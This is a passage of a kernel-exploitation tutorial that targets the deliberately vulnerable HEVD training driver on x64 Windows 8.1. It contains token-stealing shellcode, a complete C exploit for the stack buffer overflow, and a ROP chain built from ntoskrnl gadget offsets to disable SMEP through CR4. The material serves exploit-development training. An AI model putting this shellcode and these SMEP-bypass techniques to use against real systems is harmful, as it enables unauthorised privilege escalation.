+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> [<span style="color:#66d9ef">rbx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">TOKEN_OFFSET</span>], <span style="color:#66d9ef">rcx</span>       <span style="color:#75715e">; Copy SYSTEM token to current process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; End of Token Stealing Stub
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">rcx</span>                             <span style="color:#75715e">; Restore registers
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">rbx</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ret</span>                                           
+</span></span></code></pre></div><p>It&rsquo;s more or less the same shellcode as last time, just with different offsets and 64 bit registers.  There&rsquo;s only one line I added that might not be immediately clear:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>    <span style="color:#a6e22e">and</span> <span style="color:#66d9ef">cl</span>, <span style="color:#ae81ff">0xf0</span>                              <span style="color:#75715e">; Clear the reference count
+</span></span></span></code></pre></div><p>There&rsquo;s a bit of a quirk with the <code>AccessToken</code> pointer field in the <code>EPROCESS</code> struct.  The actual Access Token the field points to is always written to a memory address that is a multiple of 0x10 (as an optimization for stack alignment).  This means the bottom 4 bits of the pointer are always 0.</p>
+<p>Back in the early days of computers, every bit of memory was expensive, and using memory as efficiently as possible was a high priority.  We know these bits are 0, so there&rsquo;s no need to explicitly store them.  This means they can be used for something else.  Windows uses those bits to keep track of how many active references there are to the token within the process.</p>
+<p>Our exploit code doesn&rsquo;t have the same number of references to the token as the SYSTEM process, so it&rsquo;s best to clear them out.  If you&rsquo;re feeling exact, you could probably copy the references from the old token to the new one, but in practice that is rarely done.</p>
+<p>You can compile the code with NASM:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>nasm shellcode.asm -o shellcode.o
+</span></span></code></pre></div><p>Theno open <code>shellcode.o</code> with <a href="https://mh-nexus.de/en/hxd/" target="_blank">HxD</a>, highlight the bytes in the text window, and do <code>Edit</code> -&gt; <code>Copy as</code> -&gt; <code>C</code>.</p>
+<p><img src="./images/7_copy_bytestring.gif" alt="Copy bytestring"></p>
+<p>The byte string with the shellcode won&rsquo;t be stored in executable memory by default, so we&rsquo;ll need to allocate some executable space for it and copy it over.  This can be done with the <code>VirtualAlloc</code> and <code>RtlCopyMemory</code> functions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>lpShellcode <span style="color:#f92672">=</span> VirtualAlloc(NULL, 
+</span></span><span style="display:flex;"><span>                           shellcodeSize,
+</span></span><span style="display:flex;"><span>                           MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE,
+</span></span><span style="display:flex;"><span>                           PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RtlCopyMemory(lpShellcode, TokenStealingPayloadWin8, shellcodeSize);
+</span></span></code></pre></div><p>Make sure to assign the memory from <code>VirtualAlloc</code> <code>RWX</code> permissions so we can both copy in the shellcode and run it.</p>
+<p>Here is the reworked x64 version of the exploit code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable IOCTL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define HEVD_IOCTL_BUFFER_OVERFLOW \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    CTL_CODE( 0x22, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS )
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Sizes for overflow
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define BUFFER_SIZE 2048
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define POINTER_SIZE 8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>CHAR TokenStealingPayloadWin8[] <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x2D</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0xE0</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xF9</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xE6</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0xF0</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xC3</span>
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">TriggerExploit</span>(HANDLE hDevice);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    HANDLE hDevice;
+</span></span><span style="display:flex;"><span>    INT result;
+</span></span><span style="display:flex;"><span>    PCWSTR lpDeviceName <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hDevice <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileW</span>(
+</span></span><span style="display:flex;"><span>        lpDeviceName,
+</span></span><span style="display:flex;"><span>        GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE,
+</span></span><span style="display:flex;"><span>        FILE_SHARE_WRITE,
+</span></span><span style="display:flex;"><span>        NULL,
+</span></span><span style="display:flex;"><span>        OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>        FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>        NULL
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hDevice <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to open handle to driver: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Device opened successfully!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#a6e22e">TriggerExploit</span>(hDevice);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (result <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Exploit failed: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Cleaning up and closing handle...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hDevice);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">TriggerExploit</span>(HANDLE hDevice) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    UINT64 <span style="color:#f92672">*</span>lpInBuffer;
+</span></span><span style="display:flex;"><span>    LPVOID  lpShellcode;
+</span></span><span style="display:flex;"><span>    SIZE_T  inBufferSize;
+</span></span><span style="display:flex;"><span>    DWORD   bytesReturned;
+</span></span><span style="display:flex;"><span>    SIZE_T  shellcodeSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(TokenStealingPayloadWin8);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate space for the shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Allocating executable memory for shellcode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    lpShellcode <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, 
+</span></span><span style="display:flex;"><span>                               shellcodeSize,
+</span></span><span style="display:flex;"><span>                               MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE,
+</span></span><span style="display:flex;"><span>                               PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>lpShellcode) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate memory for shellcode: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Copy shellcode into executable user space memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">RtlCopyMemory</span>(lpShellcode, TokenStealingPayloadWin8, shellcodeSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Shellcode copied into executable memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate a buffer of the correct size for the overflow.  Need to overflow 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// the buffer, three callee saved registers, and the return address.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    inBufferSize <span style="color:#f92672">=</span> BUFFER_SIZE <span style="color:#f92672">+</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> POINTER_SIZE) <span style="color:#f92672">+</span> POINTER_SIZE;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Alocate the user buffer to be sent to the driver
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    lpInBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, inBufferSize);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>lpInBuffer) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate memory for buffer: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Created buffer of size: %zu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, inBufferSize);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set buffer to be full of &#39;A&#39;s
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">RtlFillMemory</span>(lpInBuffer, inBufferSize, <span style="color:#e6db74">&#39;A&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set last bytes of buffer to point to the shellcode.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    lpInBuffer[(inBufferSize <span style="color:#f92672">/</span> POINTER_SIZE) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> (UINT64)lpShellcode;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Sending buffer with IOCTL: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HEVD_IOCTL_BUFFER_OVERFLOW);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    BOOL result <span style="color:#f92672">=</span> <span style="color:#a6e22e">DeviceIoControl</span>(
+</span></span><span style="display:flex;"><span>        hDevice,
+</span></span><span style="display:flex;"><span>        HEVD_IOCTL_BUFFER_OVERFLOW,
+</span></span><span style="display:flex;"><span>        lpInBuffer,
+</span></span><span style="display:flex;"><span>        inBufferSize,
+</span></span><span style="display:flex;"><span>        NULL,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>bytesReturned,
+</span></span><span style="display:flex;"><span>        NULL
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>result) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to send IOCTL to HEVD Driver: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] IOCTL sent successfully to HEVD driver!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing input buffer...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpInBuffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Let&rsquo;s set a breakpoint at the end of the vulnerable function and run this.</p>
+<p><img src="./images/8_end_of_vulnfunc.png" alt="Vulnfunc end"></p>
+<p>When we hit the breakpoint, the return address can be easily seen in the stack trace:</p>
+<p><img src="./images/9_return_addr.png" alt="Return address"></p>
+<p>And if we disassemble a few instructions the at the return address, we can see our shellcode.  Perfect!</p>
+<p><img src="./images/10_disassembly_at_return.png" alt="Shellcode"></p>
+<p>But if we step one more time, instead of entering the shellcode, the VM crashes, and we get the following bugcheck code.</p>
+<p><img src="./images/11_attempted_execute_of_nx.png" alt="Attempted execute of NX"></p>
+<p>What happened?</p>
+<blockquote>
+<p>For those of you with an AMD CPU, your VM might have stepped right into the shellcode with no problem.  This is because Microsoft&rsquo;s support for AMD virtualization is extremely subpar, to the point where modern kernel mitigations simply don&rsquo;t work in VMs on AMD machines.</p>
+<p>The kernel mitigations are running on the host, just not the VM, so it is still necessary to bypass them even on AMD.  But if you have an AMD CPU, you just have to eyeball disabling the mitigations until you can test on an Intel machine.  Follow the rest of the code here and verify that everything looks right, and it should still be pretty stable when it comes time to test.</p>
+</blockquote>
+<h2 id="smap--smep">SMAP / SMEP</h2>
+<p>In around 2010 Microsoft begain using <strong>SMEP</strong>.  SMEP is a CPU feature that allows the OS to prevent execution of memory pages belonging to a user process by the kernel.  It is a derivation of <a href="https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention" target="_blank">SMAP</a>, which prevents all access to user space memory from the kernel.</p>
+<p>What this means, in effect, is that the kernel cannot execute any memory that is owned by a user.  It&rsquo;s sort of like DEP/NX, except all user pages are marked as NX from the kernel&rsquo;s perspective.</p>
+<p>That&rsquo;s why the jump to the user space program didn&rsquo;t work.  When we jumped to the user space shellcode, it was like trying to execute shellcode in a non-executable page.</p>
+<h2 id="disabling-smep">Disabling SMEP</h2>
+<p>Fortunately for us, SMEP can be turned on and off as when needed.</p>
+<p>SMEP is set with the 20th bit of the <code>CR4</code> <a href="https://en.wikipedia.org/wiki/Control_register#CR4" target="_blank">control register</a>.  If the bit is a <code>1</code> SMEP is enabled, and if it is a <code>0</code> SMEP is disabled.</p>
+<p>Control registers are special registers included in the x64 processor specification that control processor behavior.  There are any number of things control registers can modify, including whether to use the cache, a bunch of different security features, and more.  SMEP and SMAP are included in this.</p>
+<p>But how do we flip the 20th bit of the CR4 register?  The easiest way to do it in this situation is with a ROP chain.</p>
+<h2 id="what-to-set-smep-to">What to set SMEP to</h2>
+<p>First, let&rsquo;s figure out what value we should set the <code>CR4</code> register to.</p>
+<p>In WinDbg, printing out the CR4 value looks like the following:</p>
+<p><img src="./images/12_cr4.png" alt="CR4 value"></p>
+<p>SMEP is set by the 20th bit, which is the one pointed to by the red arrow.</p>
+<p>The following <code>C</code> macros make it easy to get the new value from the old one.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define SMEP_BIT 20
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CR4_ORIG_VALUE 0x00000000001406f8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define CR4_SMEP_DISABLED (CR4_ORIG_VALUE &amp; ~(1 &lt;&lt; SMEP_BIT))
+</span></span></span></code></pre></div><p>If we do the same thing in Python, we&rsquo;ll see the new value <code>CR4</code> needs to be set to is <code>0x406f8</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> hex(<span style="color:#ae81ff">0x00000000001406f8</span> <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>(<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">20</span>))
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;0x406f8&#39;</span>
+</span></span></code></pre></div><p>And by setting <code>CR4</code> to that in WinDbg manually, we can see the SMEP bit has been turned off, but everything else is the same.</p>
+<p><img src="./images/13_cr4_disabled.png" alt="CR4 disabled"></p>
+<h2 id="rop-to-disable-smep">ROP to disable SMEP</h2>
+<p>Gadget offsets will change with just about every version of the Windows kernel, so it&rsquo;s good to document which version we&rsquo;re working with in case anyone wants to port our exploit to a different version of Windows down the line.</p>
+<p>This can be done easily through the debugger with the <code>vertarget</code> command:</p>
+<p><img src="./images/14_vertarget.png" alt="Vertarget"></p>
+<p>Also take note of the kernel base.  We&rsquo;ll find a way to determine it dynamically later, but for now the base won&rsquo;t change because we&rsquo;ve been using the same snapshot for all of the tests, so we can use this base to test if our gadgets work.</p>
+<p>Now, copy <code>C:\Windows\System32\ntoskrnl.exe</code> <strong>from the VM</strong> to your host machine.</p>
+<p>Let&rsquo;s find some gadgets. I used <a href="https://github.com/0vercl0k/rp" target="_blank">r++</a> for this because it has a nice Windows executable in the &ldquo;Releases&rdquo; section on Github, but you can use any one you want.  They all more or less do the same thing.  If you&rsquo;re feeling brave it&rsquo;s even possible to do this with just WinDbg, but in my opinion there&rsquo;s no reason to go through more pain than necessary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>.\rp-win.exe --va 0 --file .\ntoskrnl.exe --rop 2 &gt; gadgets.txt
+</span></span></code></pre></div><p>Important options are:</p>
+<ul>
+<li><code>--va 0</code>: give the gadgets in terms of their offsets from the start of the binary</li>
+<li><code>--rop 2</code>: only show gadgets with two instruction depth</li>
+</ul>
+<p>Looking through the <code>gadgets.txt</code> file for any mentions of <code>cr4</code>, we find the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>0x38a3cc: mov cr4, rax ; add rsp, 0x28 ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>0x086557: mov cr4, rax ; mov cr4, rcx ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>0x1e64e9: mov cr4, rax ; mov cr4, rcx ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>0x384f10: mov cr4, rcx ; add rsp, 0x28 ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>0x08655a: mov cr4, rcx ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>0x1e64ec: mov cr4, rcx ; ret ; (1 found)
+</span></span></code></pre></div><p>Either of the last two gadgets will do perfectly.  The <code>mov cr4, rcx ; ret</code> gadget allow us to set <code>cr4</code> to the value that&rsquo;s in <code>rcx</code>.  All we have to do now is find a gadget that puts a value in <code>rcx</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x378df6: pop rcx ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>0x37a82d: pop rcx ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>0x37e694: pop rcx ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>0x384a8e: pop rcx ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>0x38856a: pop rcx ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>0x3895a3: pop rcx ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>0x020b29: pop rcx ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>0x036e83: pop rcx ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>0x07db64: pop rcx ; ret ; (1 found)
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>As expected, there&rsquo;s about a million of them.</p>
+<p>In a normal user mode exploit for a pwn chall, this would be all we need.  However, we have to to resume execution of the main kernel after the exploit is complete, so we need to take the previous function&rsquo;s stack frame into consideration.  If we just stack the gadgets starting at the return address, we&rsquo;ll corrupt the previous function&rsquo;s stack frame.</p>
+<p><img src="./images/15_gadget_stack_corruption.gif" alt="Gadget stack corruption"></p>
+<p>Looking at the previous function in the stack frame&rsquo;s assembly:</p>
+<p><img src="./images/16_prev_func_assembly.png" alt="Prev function assembly"></p>
+<p>We can see we got lucky.  The next thing it does is clean up its own stack and return.  This means we have <code>0x28</code> bytes after the return address to work with for our ROP chain.</p>
+<p>Let&rsquo;s add the gadgets to the code and build the chain.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// ROP Gadgets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Windows 8.1 Kernel Version 9600 MP (1 procs) Free x64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define POP_RCX     0x140378df6      </span><span style="color:#75715e">// : pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define MOV_CR4_RCX 0x14008655a      </span><span style="color:#75715e">// : mov cr4, rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define CHAIN_SIZE 4 * POINTER_SIZE  
+</span></span></span></code></pre></div><p>And to add the chain to the end of the buffer, we can do the following:</p>
